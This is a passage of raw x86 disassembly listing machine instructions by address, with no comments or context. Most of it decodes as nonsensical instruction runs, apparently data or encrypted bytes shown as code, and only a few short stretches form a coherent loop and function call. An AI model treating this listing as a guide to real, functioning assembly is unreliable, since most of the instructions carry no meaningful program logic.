  4110db:	ds push ebp
  4110dd:	xor    ah,dh
  4110df:	loopne 0x411083
  4110e1:	je     0x41106e
  4110e3:	(bad)  
  4110e4:	mov    al,BYTE PTR [ecx]
  4110e6:	jne    0x411098
  4110e8:	add    ecx,ebx
  4110ea:	repnz daa 
  4110ec:	stos   BYTE PTR es:[edi],al
  4110ed:	ror    eax,1
  4110ef:	aam    0x4
  4110f1:	sbb    ch,BYTE PTR [esi-0x23b5c03d]
  4110f7:	push   edi
  4110f8:	xchg   ecx,eax
  4110f9:	sub    esp,eax
  4110fb:	adc    dl,cl
  4110fd:	mov    DWORD PTR [ebx+0x10],0x5b70f8
  411104:	out    0x4,eax
  411106:	call   0x9167f9fb
  41110b:	sti    
  41110c:	and    dl,bh
  41110e:	pop    esp
  41110f:	retf   
  411110:	push   es
  411111:	cmp    eax,0xd7995c47
  411116:	xchg   BYTE PTR [esi],bh
  411118:	mov    esp,0xf7c98837
  41111d:	leave  
  41111e:	push   cs
  41111f:	scas   eax,DWORD PTR es:[edi]
  411120:	jl     0x4110f5
  411122:	lods   al,BYTE PTR ds:[esi]
  411123:	xor    esp,ebp
  411125:	adc    DWORD PTR [eax+edi*1-0x29],ebp
  411129:	pop    eax
  41112a:	dec    eax
  41112b:	inc    edx
  41112c:	inc    DWORD PTR [ecx-0x7b]
  41112f:	int    0xd7
  411131:	jp     0x411183
  411133:	outs   dx,DWORD PTR ds:[esi]
  411134:	enter  0x70b,0xa9
  411138:	retf   0xb85a
  41113b:	cmp    eax,0x347de0e8
  411140:	add    edi,ebx
  411142:	jp     0x4111c2
  411144:	and    ecx,DWORD PTR [esi+0x601b5ea1]
  41114a:	lds    eax,FWORD PTR [edx-0x5550edea]
  411150:	sub    ebp,DWORD PTR [eax+0x6a]
  411153:	rsm    
  411155:	pop    edi
  411156:	and    al,0xab
  411158:	stos   DWORD PTR es:[edi],eax
  411159:	xor    BYTE PTR [esi],0x76
  41115c:	iret   
  41115d:	and    DWORD PTR [esi-0x4e],edx
  411160:	mov    ebp,0x731d1607
  411165:	jg     0x4111d9
  411167:	pushf  
  411168:	add    DWORD PTR ds:0x533d46da,0x660458aa
  411172:	adc    ebx,esi
  411174:	fistp  WORD PTR [eax-0x5d46f9bb]
  41117a:	fstp   QWORD PTR [edx+eax*1-0x7b]
  41117e:	scas   eax,DWORD PTR es:[edi]
  41117f:	mov    cl,0x68
  411181:	jmp    0x4b8d:0x28e03f4a
  411188:	pop    ebp
  411189:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41118a:	popf   
  41118b:	jg     0x41119c
  41118d:	je     0x411131
  41118f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411190:	imul   esp,eax,0x4d4b1306
  411196:	bound  esp,QWORD PTR [esi+eax*2+0x45]
  41119a:	jl     0x41114c
  41119c:	mov    BYTE PTR [ebp+0x2aa000e6],dh
  4111a2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4111a3:	loope  0x411185
  4111a5:	lahf   
  4111a6:	xor    BYTE PTR [edx-0x2a00feaa],dl
  4111ac:	jno    0x41121a
  4111ae:	xchg   ebx,eax
  4111af:	inc    edx
  4111b0:	add    bh,al
  4111b2:	cmp    eax,0x86f23f27
  4111b7:	ins    BYTE PTR es:[edi],dx
  4111b8:	das    
  4111b9:	jmp    0xf248:0x397eda75
  4111c0:	push   esi
  4111c1:	(bad)  
  4111c2:	imul   esp,DWORD PTR [edx],0xffffffe5
  4111c5:	push   ebp
  4111c6:	xchg   esp,eax
  4111c7:	dec    eax
  4111c8:	xchg   esi,eax
  4111c9:	gs js  0x4111f8
  4111cc:	sti    
  4111cd:	enter  0x4926,0x4e
  4111d1:	lods   al,BYTE PTR ds:[esi]
  4111d2:	daa    
  4111d3:	ins    BYTE PTR es:[edi],dx
  4111d4:	dec    ecx
  4111d5:	sar    al,cl
  4111d7:	cs cmp ebp,ecx
  4111da:	add    eax,edi
  4111dc:	test   dh,bh
  4111de:	mov    bh,BYTE PTR [ebx]
  4111e0:	das    
  4111e1:	or     esi,edx
  4111e3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4111e4:	jmp    0x5975:0xea5f3179
  4111eb:	iret   
  4111ec:	jno    0x41119e
  4111ee:	cmp    eax,0x8f36033f
  4111f3:	ror    DWORD PTR [esi+0x31],0x1b
  4111f7:	aam    0x9e
  4111f9:	mov    dl,0xdc
  4111fb:	fcomp  st(0)
  4111fd:	pop    ss
  4111fe:	adc    ch,BYTE PTR [ebp+0x308da00c]
  411204:	mov    al,0x24
  411206:	lock jle 0x41118e
  411209:	xor    eax,0xaa46f69b
  41120e:	pop    ecx
  41120f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411210:	in     al,dx
  411211:	pop    edx
  411212:	jmp    0x12:0x97eade80
  411219:	or     eax,0xb0a946b1
  41121e:	lods   al,BYTE PTR ds:[esi]
  41121f:	pop    eax
  411220:	and    eax,0xfe45a495
  411225:	leave  
  411226:	jns    0x411205
  411228:	xor    DWORD PTR [eax+esi*2+0x7e],ebp
  41122c:	stos   BYTE PTR es:[edi],al
  41122d:	popa   
  41122e:	adc    BYTE PTR [ebp+0x74c608d1],al
  411234:	outs   dx,DWORD PTR ds:[esi]
  411235:	rcr    ebp,1
  411237:	out    dx,eax
  411238:	leave  
  411239:	xchg   ebx,eax
  41123a:	lods   eax,DWORD PTR ds:[esi]
  41123b:	pop    ebx
  41123c:	xor    al,0xdd
  41123e:	clc    
  41123f:	fisubr DWORD PTR [edx]
  411241:	jno    0x4111f3
  411243:	jge    0x411253
  411245:	xlat   BYTE PTR ds:[ebx]
  411246:	sti    
  411247:	cmp    edx,DWORD PTR [ecx+0x4fd5ffc7]
  41124d:	pop    ecx
  41124e:	cmp    ebx,DWORD PTR [eax+ecx*2]
  411251:	lods   eax,DWORD PTR ds:[esi]
  411252:	ror    BYTE PTR [esi+0x79],1
  411255:	dec    esp
  411256:	mov    BYTE PTR [edi+ecx*4-0x6f],ah
  41125a:	test   DWORD PTR [eax],0xcc2174be
  411260:	fwait
  411261:	js     0x41120b
  411263:	iret   
  411264:	xchg   ecx,eax
  411265:	jae    0x411203
  411267:	mov    ecx,DWORD PTR [esi]
  411269:	or     DWORD PTR [edi-0x278e27dd],eax
  41126f:	sub    BYTE PTR [edi],dl
  411271:	cmp    dh,BYTE PTR [ebp+edi*4-0x35]
  411275:	xchg   ch,dl
  411277:	adc    eax,0xeeb42e38
  41127c:	or     BYTE PTR es:0x1601df,dl
  411283:	mov    dl,0x20
  411285:	mov    ds:0x2f9beb59,al
  41128a:	je     0x41123a
  41128c:	mov    ecx,edi
  41128e:	sbb    al,0x75
  411290:	popa   
  411291:	jno    0x411262
  411293:	popf   
  411294:	gs (bad) 
  411296:	sbb    BYTE PTR [eax-0x60],bl
  411299:	in     al,0xfe
  41129b:	mov    gs,WORD PTR [eax-0xc48f9fd]
  4112a1:	inc    ebx
  4112a2:	rcr    BYTE PTR [eax+ecx*2+0x508570c],1
  4112a9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4112aa:	(bad)  [ecx+0x9]
  4112ad:	pushf  
  4112ae:	(bad)  
  4112af:	gs inc ecx
  4112b1:	xor    ebp,DWORD PTR [edi-0x23]
  4112b4:	shr    BYTE PTR [eax+0x72],0x6a
  4112b8:	mov    bl,0xbe
  4112ba:	leave  
  4112bb:	shr    BYTE PTR [ecx],1
  4112bd:	push   0x6d
  4112bf:	xchg   eax,edx
  4112c1:	add    eax,0x87624253
  4112c6:	or     eax,0x69598652
  4112cb:	into   
  4112cc:	icebp  
  4112cd:	xlat   BYTE PTR ds:[ebx]
  4112ce:	jge    0x411289
  4112d0:	cmp    eax,0xf674afb3
  4112d5:	xor    BYTE PTR [ebx+0x633d35d5],ch
  4112db:	and    eax,0xd46ef59e
  4112e0:	pop    ebx
  4112e1:	loop   0x4112e5
  4112e3:	das    
  4112e4:	ja     0x411321
  4112e6:	(bad)  
  4112e7:	int3   
  4112e8:	in     eax,0x40
  4112ea:	hlt    
  4112eb:	(bad)  
  4112ec:	out    dx,eax
  4112ed:	imul   ecx,DWORD PTR [edi+0x3a],0xffffff8d
  4112f1:	jns    0x4112cc
  4112f3:	test   eax,0x28b1310e
  4112f8:	cdq    
  4112f9:	push   esp
  4112fa:	ret    
  4112fb:	lods   al,BYTE PTR ds:[esi]
  4112fc:	pop    esp
  4112fd:	mov    bl,BYTE PTR [esi]
  4112ff:	adc    ah,ch
  411301:	xchg   edx,eax
  411302:	(bad)  
  411303:	(bad)  
  411305:	xchg   ebx,eax
  411306:	mov    al,ds:0x116bab49
  41130b:	xchg   ebx,eax
  41130c:	adc    DWORD PTR [edx+0x1b16f12f],eax
  411312:	pop    edx
  411313:	jb     0x4112ef
  411315:	mov    dl,0x17
  411317:	call   0xe2cf407b
  41131c:	push   ebx
  41131d:	jo     0x41131f
  41131f:	push   ecx
  411320:	icebp  
  411321:	jo     0x4112e4
  411323:	mov    bl,0x1e
  411325:	jne    0x4112de
  411327:	cmp    edi,DWORD PTR [edi-0x796e8fd2]
  41132d:	cmp    DWORD PTR [esi],ebp
  41132f:	in     eax,dx
  411330:	xchg   ebp,eax
  411331:	fst    st(3)
  411333:	jnp    0x41139a
  411335:	aas    
  411336:	xor    eax,0xc0178b73
  41133b:	pop    ecx
  41133c:	dec    esp
  41133d:	test   eax,0xd422f665
  411342:	mov    ecx,0xfa226560
  411347:	adc    al,0x3f
  411349:	(bad)  
  41134a:	jmp    0xdbed0eb5
  41134f:	stos   DWORD PTR es:[edi],eax
  411350:	out    0xf2,al
  411352:	mov    ecx,0xbab7994b
  411357:	loop   0x411343
  411359:	pop    ebx
  41135a:	test   BYTE PTR [edi-0x3f54bdf4],dh
  411360:	js     0x41130b
  411362:	sbb    al,0xba
  411364:	cmp    ebp,DWORD PTR [ebx]
  411366:	adc    eax,0xc81312bf
  41136b:	add    eax,DWORD PTR [ebx+edx*4-0x7]
  41136f:	mov    eax,0xe69db649
  411374:	popa   
  411375:	mov    cs,WORD PTR [esi+0x793ffb53]
  41137b:	xchg   ecx,eax
  41137c:	fisubr WORD PTR [esi-0x70a58e9]
  411382:	inc    esi
  411383:	cmc    
  411384:	scas   al,BYTE PTR es:[edi]
  411385:	push   edi
  411386:	es (bad) 
  411388:	xchg   esp,eax
  411389:	add    ah,BYTE PTR [edi-0xcaab744]
  41138f:	daa    
  411390:	shl    DWORD PTR [edx],0xc2
  411393:	rcl    BYTE PTR [ebp-0x33],1
  411396:	ficomp WORD PTR [ebp+0x5fa07a09]
  41139c:	mov    edx,0xedf216a
  4113a1:	fwait
  4113a2:	sahf   
  4113a3:	and    eax,DWORD PTR [ecx-0x6e]
  4113a6:	sub    eax,0x7250e06c
  4113ab:	sub    al,0x52
  4113ad:	daa    
  4113ae:	mov    ecx,0xcd5e4915
  4113b3:	push   ds
  4113b4:	enter  0x5e31,0xad
  4113b8:	mov    ebx,0xe326377b
  4113bd:	lds    ecx,FWORD PTR [eax]
  4113bf:	sub    al,0xbe
  4113c2:	pop    DWORD PTR [eax+0x3b]
  4113c5:	mov    bh,0x5
  4113c8:	jno    0x4113c7
  4113ca:	inc    edx
  4113cb:	add    ah,ah
  4113cd:	js     0x4113cf
  4113cf:	add    BYTE PTR [edi],cl
  4113d1:	test   ah,al
  4113d3:	or     BYTE PTR [eax],al
  4113d5:	add    BYTE PTR [ecx+0x41b224],ah
  4113db:	and    DWORD PTR ds:0x42fdfa,0x0
  4113e5:	mov    esi,DWORD PTR ds:0x42fdfa
  4113eb:	inc    esi
  4113ec:	mov    DWORD PTR ds:0x42fdfa,esi
  4113f2:	cmp    DWORD PTR ds:0x42fdfa,0x8
  4113f9:	jne    0x41140f
  4113ff:	push   0x42e267
  411404:	push   0x42e2ed
  411409:	call   DWORD PTR ds:0x42e5e7
  41140f:	cmp    DWORD PTR ds:0x42fdfa,0x7
  411416:	jne    0x411429
  41141c:	mov    esi,DWORD PTR ds:0x42fdfa
  411422:	inc    esi
  411423:	mov    DWORD PTR ds:0x42fdfa,esi
  411429:	cmp    DWORD PTR ds:0x42fdfa,0x13
  411430:	jb     0x4113e5
  411436:	jmp    0x41183b
  41143b:	and    cl,al
  41143d:	leave  
  41143e:	adc    ch,cl
  411440:	adc    ecx,esp
  411442:	call   0xcb53bead
  411447:	fucomp st(0)
  411449:	pushf  
  41144a:	jecxz  0x41145a
  41144c:	dec    edx
  41144d:	jo     0x4114bf
  41144f:	pop    eax
  411450:	jge    0x4114c2
  411452:	jo     0x411482
  411454:	rcl    DWORD PTR [edi],cl
  411456:	scas   eax,DWORD PTR es:[edi]
  411457:	rol    DWORD PTR [edi-0xc6f045],0x77
  41145e:	push   ds
  41145f:	push   esp
  411460:	add    DWORD PTR [esp+edi*4],ebx
  411463:	jg     0x4114a4
  411465:	pop    ss
  411466:	test   eax,0x96e1c7b6
  41146b:	stc    
  41146c:	or     eax,ebp
  41146e:	dec    eax
  41146f:	fisub  DWORD PTR [edx+0x2e]
  411472:	push   ecx
  411473:	or     BYTE PTR [eax+0x3647c046],ch
  411479:	add    bh,BYTE PTR [edi]
  41147b:	xchg   ecx,eax
  41147c:	or     ebp,edx
  41147e:	jge    0x4114ba
  411480:	ja     0x4114c4
  411482:	cmp    eax,0xabfb25a6
  411487:	add    bh,cl
  411489:	enter  0x2ffc,0x6f
  41148d:	pushf  
  41148e:	push   cs
  41148f:	mov    edi,0xe6f02e0e
  411494:	dec    ebp
  411495:	jno    0x4114fc
  411497:	fbstp  TBYTE PTR [esi+0x20]
  41149a:	push   0x5eafba77
  41149f:	bound  esi,QWORD PTR [edi+0x7fa40696]
  4114a5:	add    edi,0xe70b4d02
  4114ab:	stos   BYTE PTR es:[edi],al
  4114ac:	idiv   DWORD PTR [eax+0x24]
  4114af:	or     al,0xa2
  4114b1:	std    
  4114b2:	pop    edi
  4114b3:	mov    al,0xb9
  4114b5:	loopne 0x4114be
  4114b7:	in     eax,dx
  4114b8:	mov    ebp,0x2edac7c7
  4114bd:	sysexit 
  4114bf:	pusha  
  4114c0:	cmp    DWORD PTR [esi-0x53],edx
  4114c3:	adc    dl,al
  4114c5:	or     DWORD PTR [esi],0x1b
  4114c8:	clc    
  4114c9:	dec    ecx
  4114ca:	push   esp
  4114cb:	rcr    dh,0xfd
  4114ce:	int    0xf0
  4114d0:	mov    ah,bl
  4114d2:	pop    ds
  4114d3:	retf   0x53db
  4114d6:	sbb    al,0xf1
  4114d8:	dec    edx
  4114d9:	dec    edi
  4114da:	mov    fs,ebp
  4114dc:	sub    DWORD PTR [eax+0x1d76d1a0],ecx
  4114e2:	adc    esp,DWORD PTR [edx-0x6e]
  4114e5:	adc    eax,0x7e11c509
  4114ea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4114eb:	retf   
  4114ec:	xor    ch,BYTE PTR [ebp-0x1]
  4114ef:	lods   eax,DWORD PTR ds:[esi]
  4114f0:	xchg   DWORD PTR [ebx],esi
  4114f2:	out    0xae,al
  4114f4:	dec    ecx
  4114f5:	sti    
  4114f6:	gs sbb bl,dh
  4114f9:	and    esi,eax
  4114fb:	cs loopne 0x411575
  4114fe:	mov    esp,0xa3c42c69
  411503:	sbb    al,BYTE PTR [ebx]
  411505:	popf   
  411506:	pop    edx
  411507:	xchg   esp,eax
  411508:	add    DWORD PTR [eax],edx
  41150a:	inc    ebx
  41150b:	jmp    0x72d4:0xa4d76259
  411512:	push   0x7f630f6d
  411517:	jmp    0xc23d:0x9d903a25
  41151e:	sbb    al,0x1b
  411520:	mov    esi,0x4c331221
  411525:	test   eax,0x2d4fcf04
  41152a:	stos   DWORD PTR es:[edi],eax
  41152b:	add    DWORD PTR [ebx-0x113a9d69],eax
  411531:	inc    eax
  411532:	jp     0x411520
  411534:	out    0xe9,eax
  411536:	lock popf 
  411538:	pop    es
  411539:	mov    ch,0x16
  41153b:	mov    ebp,0xd4411a0c
  411540:	cld    
  411541:	and    ch,BYTE PTR [edx]
  411543:	cmp    eax,0xe390589e
  411548:	ja     0x411592
  41154a:	pop    ebp
  41154b:	jg     0x41159b
  41154d:	sub    al,0xf0
  41154f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411550:	adc    al,0x38
  411552:	mov    cl,0xa1
  411554:	cmp    bh,BYTE PTR [ebx]
  411556:	inc    esi
  411557:	pop    ss
  411558:	test   ecx,0x39a79b03
  41155e:	loop   0x41153f
  411560:	out    dx,al
  411561:	rcl    DWORD PTR [eax-0x16c4324c],cl
  411567:	lds    edx,FWORD PTR [edx+esi*8+0x4b618c43]
  41156e:	lods   al,BYTE PTR ds:[esi]
  41156f:	lds    ecx,FWORD PTR [ebx]
  411571:	xchg   ebp,eax
  411572:	xchg   DWORD PTR [edx-0x5],eax
  411575:	xchg   ebx,eax
  411577:	push   ds
  411578:	cmp    eax,DWORD PTR [esi-0x6e83f97c]
  41157e:	ficom  WORD PTR [edx]
  411580:	aas    
  411581:	nop
  411582:	dec    esi
  411583:	inc    eax
  411584:	out    0x43,al
  411586:	cli    
  411587:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411588:	mov    ecx,ebx
  41158a:	inc    esp
  41158b:	loope  0x4115fb
  41158d:	cmp    DWORD PTR [ebx-0x2d91686b],ebx
  411593:	inc    edx
  411594:	nop
  411595:	in     eax,0xf
  411597:	or     BYTE PTR [edi+0x73],bl
  41159a:	xor    al,0x1a
  41159c:	les    ebx,FWORD PTR [eax+0x60dbfb32]
  4115a2:	fimul  WORD PTR [eax+ebx*8]
  4115a5:	(bad)  
  4115a6:	mov    DWORD PTR [eax+edx*2-0x196caa2d],edx
  4115ad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4115ae:	mov    dh,0xe1
  4115b0:	iret   
  4115b1:	xchg   esp,eax
  4115b2:	jl     0x411544
  4115b4:	in     al,0xd6
  4115b6:	int3   
  4115b7:	in     al,0xc1
  4115b9:	push   es
  4115ba:	test   eax,0x9d0b10ad
  4115bf:	(bad)  
  4115c0:	push   esp
  4115c1:	out    0x25,eax
  4115c3:	push   cs
  4115c4:	std    
  4115c5:	bnd je 0x411599
  4115c8:	dec    ebx
  4115c9:	jne    0x4115b5
  4115cb:	fld    DWORD PTR [esi]
  4115cd:	cmc    
  4115ce:	sbb    ebp,DWORD PTR [edx]
  4115d0:	mov    cl,0xa
  4115d2:	leave  
  4115d3:	or     DWORD PTR [ecx+edi*4+0x1527b6be],edx
  4115da:	mov    ah,0x0
  4115dc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4115dd:	cmp    edx,DWORD PTR [ecx]
  4115df:	mov    ecx,0xffcdf95f
  4115e4:	cmp    edx,DWORD PTR [edi+eiz*1]
  4115e7:	push   esp
  4115e8:	jno    0x4115b0
  4115ea:	xchg   esp,eax
  4115eb:	jns    0x4115b8
  4115ed:	inc    edi
  4115ee:	gs iret 
  4115f0:	mov    ebx,0xf1f3923e
  4115f5:	ss jae 0x411629
  4115f8:	sti    
  4115f9:	adc    bl,BYTE PTR [eax+0x1da4ef72]
  4115ff:	mov    BYTE PTR [eax-0x7f0b9eff],cl
  411605:	pusha  
  411606:	out    0x7d,al
  411608:	adc    al,0xae
  41160a:	gs push cs
  41160c:	dec    ecx
  41160d:	scas   eax,DWORD PTR es:[edi]
  41160e:	call   0xa70c:0xa16d23b0
  411615:	pop    edx
  411616:	push   ebx
  411617:	test   BYTE PTR [esi],bh
  411619:	ja     0x411656
  41161b:	addr16 and bh,dh
  41161e:	addr16 inc ecx
  411620:	clc    
  411621:	push   edi
  411622:	lds    edi,FWORD PTR [edi+0x75ddbb5d]
  411628:	mov    WORD PTR [ebp+0x49],ds
  41162b:	repz add DWORD PTR ss:[eax+0x534bd877],eax
  411633:	jne    0x4115be
  411635:	ret    
  411636:	(bad)  
  411637:	mov    BYTE PTR [edi],dl
  411639:	packuswb mm6,mm6
  41163c:	call   FWORD PTR [ecx]
  41163e:	dec    esp
  41163f:	aam    0xf2
  411641:	mov    bh,0x17
  411643:	mov    bh,0x80
  411645:	(bad)  
  411646:	mov    ds:0xdec8a998,eax
  41164b:	or     dl,BYTE PTR ds:0xd182f0b4
  411651:	mov    ebx,0xe92e62bf
  411656:	push   ebp
  411657:	mov    ds,WORD PTR [ebx-0x6b]
  41165a:	enter  0x124d,0x74
  41165e:	mov    eax,0x1b6aa873
  411663:	sub    BYTE PTR [ecx+edx*2],cl
  411666:	inc    esp
  411667:	int3   
  411668:	adc    esp,DWORD PTR [esi]
  41166a:	jmp    0xf20d:0x77a01e1
  411671:	xor    al,0x93
  411673:	inc    ebx
  411674:	fmulp  st(2),st
  411676:	jl     0x411640
  411678:	icebp  
  411679:	cmp    BYTE PTR [esi-0x68827841],dl
  41167f:	pop    ebx
  411680:	repz mov ch,BYTE PTR [esi+ebx*8+0x6a]
  411685:	call   FWORD PTR [edx+0x734da657]
  41168b:	jb     0x4116dd
  41168d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41168e:	iret   
  41168f:	daa    
  411690:	fistp  WORD PTR [edx-0xd]
  411693:	imul   ebp,DWORD PTR [esi+esi*8-0x721eb481],0x4fc3b64
  41169e:	stos   BYTE PTR es:[edi],al
  41169f:	xchg   esi,eax
  4116a0:	sub    DWORD PTR [edi],ecx
  4116a2:	jnp    0x411674
  4116a4:	add    al,0xc9
  4116a6:	mov    BYTE PTR [edx],bh
  4116a8:	sub    eax,0xed5dcc93
  4116ad:	mov    eax,ds:0x197306c6
  4116b2:	or     bl,ch
  4116b4:	cmovb  edi,DWORD PTR [ebp+ebx*2-0x44671f9b]
  4116bc:	stos   BYTE PTR es:[edi],al
  4116bd:	and    eax,0xa656af66
  4116c2:	jl     0x4116de
  4116c4:	push   edi
  4116c5:	push   edx
  4116c6:	push   ds
  4116c7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4116c8:	outs   dx,BYTE PTR ds:[esi]
  4116c9:	ret    0xc87e
  4116cc:	sahf   
  4116cd:	js     0x411682
  4116cf:	daa    
  4116d0:	rcl    esp,0x6e
  4116d3:	xor    BYTE PTR [esi],0x6d
  4116d6:	push   ebp
  4116d7:	xchg   ebp,eax
  4116d8:	jmp    FWORD PTR [edi-0x1e680750]
  4116de:	or     esi,ebp
  4116e0:	mov    eax,ds:0x9ba0e266
  4116e5:	into   
  4116e6:	out    dx,eax
  4116e7:	pop    ecx
  4116e8:	stos   BYTE PTR es:[edi],al
  4116e9:	push   cs
  4116ea:	mov    ds:0x5ab62364,al
  4116ef:	out    dx,eax
  4116f0:	addr16 pushf 
  4116f2:	(bad)  
  4116f3:	pop    ss
  4116f4:	jmp    0x573006e7
  4116f9:	aad    0xa8
  4116fb:	or     DWORD PTR [ecx],edx
  4116fd:	into   
  4116fe:	data16 mov cl,0x53
  411702:	ror    BYTE PTR [esi+0x20],1
  411705:	mov    eax,ds:0x6e1e78f3
  41170a:	scas   al,BYTE PTR es:[edi]
  41170b:	dec    edi
  41170c:	pop    es
  41170d:	add    ecx,edx
  41170f:	mov    dh,0x1
  411711:	push   es
  411712:	mov    al,0x5d
  411714:	in     eax,0x0
  411716:	jnp    0x41178b
  411718:	shl    ah,cl
  41171a:	fdiv   QWORD PTR [eax]
  41171c:	push   esp
  41171d:	sbb    edi,DWORD PTR [esi]
  41171f:	or     bl,0x8
  411722:	xor    eax,0x3a9af254
  411727:	sub    edi,DWORD PTR [edi+0x72]
  41172a:	cld    
  41172b:	mov    bh,0x19
  41172d:	xor    BYTE PTR [esi-0x53],bh
  411730:	enter  0xd904,0xfa
  411734:	lods   al,BYTE PTR ds:[esi]
  411735:	cmc    
  411736:	outs   dx,BYTE PTR ds:[esi]
  411737:	(bad)  
  411738:	into   
  411739:	int    0x78
  41173b:	inc    ebx
  41173c:	ja     0x411733
  41173e:	sbb    BYTE PTR [edi],dl
  411740:	jne    0x4117a9
  411742:	push   ss
  411743:	and    BYTE PTR [esi+0x7871d890],ah
  411749:	sbb    edx,edx
  41174b:	add    al,0x6a
  41174d:	cmp    esi,eax
  41174f:	mov    ecx,0x8d772ecb
  411754:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411755:	or     ch,cl
  411757:	out    0xfd,al
  411759:	out    dx,al
  41175a:	test   al,0x17
  41175c:	adc    al,BYTE PTR [edi+0xdc7e610]
  411762:	div    ebx
  411764:	pop    eax
  411765:	ficom  WORD PTR [ecx-0x75084d0f]
  41176b:	adc    edx,ecx
  41176d:	cdq    
  41176e:	out    dx,eax
  41176f:	push   cs
  411770:	or     DWORD PTR [eax+0x31ec4d53],edx
  411776:	mov    ss,WORD PTR [ecx-0x3c]
  411779:	and    dh,bh
  41177b:	pop    ds
  41177c:	or     al,0x6f
  41177e:	cmp    BYTE PTR [ebp+0x44c7f6f3],bl
  411784:	test   BYTE PTR [edx],ch
  411786:	sahf   
  411787:	lods   al,BYTE PTR gs:[esi]
  411789:	(bad)  
  41178a:	(bad)  
  41178b:	outs   dx,DWORD PTR ds:[esi]
  41178c:	mov    BYTE PTR [ebp-0x4e],ch
  41178f:	inc    eax
  411790:	sbb    BYTE PTR [ecx-0x74],bl
  411793:	rcr    dh,1
  411795:	imul   esp,DWORD PTR [esi],0x2
  411798:	dec    eax
  411799:	idiv   esp
  41179b:	dec    ebp
  41179c:	jl     0x411812
  41179e:	or     DWORD PTR [ebx-0x73f5998],esi
  4117a4:	ins    DWORD PTR es:[edi],dx
  4117a5:	inc    eax
  4117a6:	jnp    0x4117bc
  4117a8:	mov    WORD PTR [ebx+0x7952e5c],?
  4117ae:	pop    esi
  4117af:	into   
  4117b0:	dec    esp
  4117b1:	and    eax,DWORD PTR [edi+0x18]
  4117b4:	mov    eax,0x7bbe0d8a
  4117b9:	inc    ecx
  4117ba:	xchg   DWORD PTR [ecx],eax
  4117bc:	das    
  4117bd:	xchg   ebp,eax
  4117be:	(bad)  
  4117bf:	jp     0x4117c4
  4117c1:	out    0x9e,al
  4117c3:	gs inc ecx
  4117c5:	cmp    DWORD PTR [ebx+0x54],0x59ca2079
  4117cc:	mov    eax,0xf7f56125
  4117d1:	arpl   WORD PTR [ebx+0x17],bx
  4117d4:	push   ebx
  4117d5:	scas   eax,DWORD PTR es:[edi]
  4117d6:	inc    edx
  4117d7:	dec    ecx
  4117d8:	add    DWORD PTR [eax],esi
  4117da:	clc    
  4117db:	sbb    BYTE PTR [edi],dl
  4117dd:	pop    eax
  4117de:	sub    esi,ebx
  4117e0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4117e1:	mov    ecx,0xe49b7bfc
  4117e6:	into   
  4117e7:	sbb    DWORD PTR [esi+0x5092f1cd],eax
  4117ed:	loop   0x411806
  4117ef:	push   cs
  4117f0:	xchg   ebp,eax
  4117f1:	dec    ebp
  4117f2:	fstp   TBYTE PTR [eax]
  4117f4:	jno    0x411875
  4117f6:	ds inc eax
  4117f8:	ss pop ecx
  4117fa:	in     eax,0x94
  4117fc:	dec    eax
  4117fd:	jbe    0x4117ad
  4117ff:	ficom  WORD PTR [edx+eax*4+0x3b288887]
  411806:	ret    
  411807:	imul   esp,eax,0xb82ce4a5
  41180d:	jno    0x4117dc
  41180f:	rcl    eax,cl
  411811:	pop    ss
  411812:	gs sbb bl,bl
  411815:	test   BYTE PTR [edi-0x2a],bh
  411818:	ficom  WORD PTR [ebp+0x24]
  41181b:	jo     0x4117f8
  41181d:	es stos BYTE PTR es:[edi],al
  41181f:	mov    fs,WORD PTR [edx+edx*2+0x1f0e658c]
  411826:	mov    dh,0x36
  411828:	std    
  411829:	pushf  
  41182a:	cs push ecx
  41182c:	loope  0x4117ce
  41182e:	sbb    DWORD PTR [ebx+0x327616e8],ebx
  411834:	jg     0x4118a4
  411836:	(bad)  
  411837:	(bad)  
  411838:	shr    DWORD PTR [ecx-0x6f],cl
  41183b:	mov    esi,DWORD PTR [ebp+0xc]
  41183e:	sub    eax,edx
  411840:	add    DWORD PTR ds:0x42fd75,0x7f3f
  41184a:	xor    eax,ecx
  41184c:	mov    DWORD PTR ds:0x42fdfa,0x5771
  411856:	cmp    eax,esi
  411858:	mov    DWORD PTR ds:0x42fdf6,0x752
  411862:	jne    0x411c7d
  411868:	jmp    0x411c6d
  41186d:	js     0x411844
  41186f:	stos   BYTE PTR es:[edi],al
  411870:	loopne 0x4118db
  411872:	jae    0x4118b6
  411874:	cmc    
  411875:	pop    esi
  411876:	sub    BYTE PTR [ecx+0x2cc5e1e9],dl
  41187c:	and    eax,0x70705776
  411881:	pop    eax
  411882:	jge    0x4118f4
  411884:	jo     0x411846
  411886:	fbld   TBYTE PTR [ebx+ebp*4+0x546f4a3e]
  41188d:	fstp   QWORD PTR [eax]
  41188f:	scas   al,BYTE PTR es:[edi]
  411890:	mov    edx,0xe88919f3
  411895:	cmp    dh,BYTE PTR [ecx+0x16]
  411898:	push   ecx
  411899:	clc    
  41189a:	ficomp DWORD PTR [ebp-0x221f37f0]
  4118a0:	xor    eax,0x5353cd1b
  4118a5:	outs   dx,BYTE PTR ds:[esi]
  4118a6:	jecxz  0x4118e4
  4118a8:	jmp    0xecbc:0xd3da4824
  4118af:	loope  0x41192e
  4118b1:	cmp    eax,ecx
  4118b3:	sbb    bh,ch
  4118b5:	sahf   
  4118b6:	mov    ch,0xc6
  4118b8:	stos   BYTE PTR es:[edi],al
  4118b9:	leave  
  4118ba:	add    bl,BYTE PTR [esp+ebx*8-0x17]
  4118be:	popa   
  4118bf:	aaa    
  4118c0:	xchg   ebx,eax
  4118c1:	ret    0x5f35
  4118c4:	bswap  edi
  4118c6:	aaa    
  4118c7:	cmp    al,0xc0
  4118c9:	add    eax,0xb7e771f
